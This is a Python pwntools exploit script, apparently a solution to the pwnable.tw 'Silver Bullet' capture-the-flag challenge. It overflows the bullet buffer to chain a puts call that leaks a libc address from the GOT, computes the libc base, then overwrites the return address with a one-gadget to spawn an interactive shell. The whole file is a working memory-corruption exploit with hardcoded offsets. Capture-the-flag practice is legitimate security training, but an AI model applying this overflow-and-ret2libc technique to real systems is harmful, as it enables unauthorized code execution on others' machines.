#!/usr/bin/env python3
from pwn import *

PORT = 10103
HOST = "chall.pwnable.tw"
elf = context.binary = ELF('./silver_bullet_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b* 0x08048869
            b* 0x080488FB
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

def sla(pr, data):
    p.sendafter(pr, data)

def menu(opt):
    sla(b"Your choice :", str(opt).encode())

def create(data):
    menu(1)
    sla(b"of bullet :", data)

def power(data):
    menu(2)
    sla(b"of bullet :", data)

def beat():
    menu(3)

# Stage 1: Leak libc

create(b"A"*47)
power(b"B")

pl = flat(
    b'\xff'*7,
    elf.plt.puts,
    elf.sym.main,
    elf.got.puts
    )

power(pl)
beat()
p.recvuntil(b" !!\x0a")
libc.address = u32(p.recv(4)) - 0x5f140
log.info(f"libc_base: {libc.address:#x}")

# Stage 2: ret2libc

create(b"A"*47)
power(b"B")

og = libc.address + 0x3a819

pl = flat(
    b'\xff'*7,
    og
    )

power(pl)
beat()

p.interactive()